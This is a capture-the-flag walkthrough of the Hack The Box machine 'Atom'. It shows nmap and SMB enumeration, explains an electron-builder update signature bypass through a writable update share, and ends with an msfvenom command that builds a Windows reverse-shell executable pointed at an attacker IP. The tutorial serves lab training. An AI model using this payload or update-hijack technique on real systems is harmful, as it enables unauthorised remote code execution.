---
title:     "Hack The Box - Atom"
tags: [windows,medium,electron,smb,portable kanban,redis,encryption,xampp,php]
categories: HackTheBox
---
[![info_card.png](/img/atom/info_card.png)](/img/atom/info_card.png)

Atom is a medium rated machine on HackTheBox by [MrR3boot](https://www.hackthebox.eu/home/users/profile/13531) which got bumped from an easy rating to medium on its release day. In this walkthrough we first will abuse the `electron-builder` update system to get a reverse shell as a user. After that we will follow two similar ways to root both involving interacting with a redis service after finding and decrypting a password  found in a config file.

# User

## Nmap

To start our enumeration of the machine, we begin with a full ports nmap scan, followed by a script and version detection scan on the open ports for a full picture on the attack surface.

`All ports scan`

```
$ sudo nmap -p- -T4  10.129.132.110
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-18 11:31 CEST
Nmap scan report for 10.129.132.110
Host is up (0.20s latency).
Not shown: 65528 filtered ports
PORT     STATE SERVICE
80/tcp   open  http
135/tcp  open  msrpc
443/tcp  open  https
445/tcp  open  microsoft-ds
5985/tcp open  wsman
6379/tcp open  redis
7680/tcp open  pando-pub

Nmap done: 1 IP address (1 host up) scanned in 1827.50 seconds
```

`Script and version scan on open ports`

```
$ sudo nmap -sC -sV -p 80,135,443,445,5985,6379,7680 10.129.132.110
Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-18 12:11 CEST
Nmap scan report for 10.129.132.110
Host is up (0.16s latency).

PORT     STATE SERVICE      VERSION
80/tcp   open  http         Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Heed Solutions
135/tcp  open  msrpc        Microsoft Windows RPC
443/tcp  open  ssl/http     Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27
|_http-title: Heed Solutions
| ssl-cert: Subject: commonName=localhost
| Not valid before: 2009-11-10T23:48:47
|_Not valid after:  2019-11-08T23:48:47
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
445/tcp  open  microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)
5985/tcp open  http         Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
6379/tcp open  redis        Redis key-value store
7680/tcp open  pando-pub?
Service Info: Host: ATOM; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 2h20m40s, deviation: 4h02m30s, median: 39s
| smb-os-discovery: 
|   OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)
|   OS CPE: cpe:/o:microsoft:windows_10::-
|   Computer name: ATOM
|   NetBIOS computer name: ATOM\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2021-04-18T03:13:34-07:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   date: 2021-04-18T10:13:33
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 98.90 seconds
```

## Web
Port 80 and 443 look most promising so we will start there. They both seem to serve the same content, which is a note taking app. You can download and install it on mac or windows, however this step is neither needed nor helpful to complete the machine, so we will just ignore it.

[![homepage.png](/img/atom/homepage.png)](/img/atom/homepage.png)

## Electron-builder

Listing the smb shares next we see a `Software_Updates_Disk` share. 

```
$ smbclient -L //10.129.132.110/
Enter WORKGROUP\jack's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        Software_Updates Disk      
SMB1 disabled -- no workgroup available
```

Connecting to it we find a pdf and 3 client folders, also the whole share is writeable.

```
$ smbclient  //10.129.132.110/Software_Updates
Enter WORKGROUP\jack's password: 
Try "help" to get a list of possible commands.
smb: \\> dir
  .                                   D        0  Sun Apr 18 11:58:47 2021
  ..                                  D        0  Sun Apr 18 11:58:47 2021
  client1                             D        0  Sun Apr 18 11:58:47 2021
  client2                             D        0  Sun Apr 18 11:58:47 2021
  client3                             D        0  Sun Apr 18 11:58:47 2021
  UAT_Testing_Procedures.pdf          A    35202  Fri Apr  9 13:18:08 2021

                4413951 blocks of size 4096. 1361200 blocks available
smb: \\> get UAT_Testing_Procedures.pdf
```

The pdf is a quality assurance documentation for the app downloadable on the webpage. 
The interesting part is especially point two, in which is stated all updates placed in any of the `client` folders will be checked and installed.

[![quality_assurance.png](/img/atom/quality_assurance.png)](/img/atom/quality_assurance.png)

There is a vulnerability in electron-builder which is described in [this](https://blog.doyensec.com/2020/02/24/electron-updater-update-signature-bypass.html) blogpost. Crafting a malicious yaml and exe, we can bypass the signature check in the install process by triggering a parse error in the signature verification script, placing a single quote in the filename. With this we are able to run an arbitrary exe on the target machine which is in our case a msfvenom reverse shell.

In a first step we create the reverse shell with msfvenom.

```
$ msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.23 LPORT=443 -f exe -o gr\\'em.exe
```
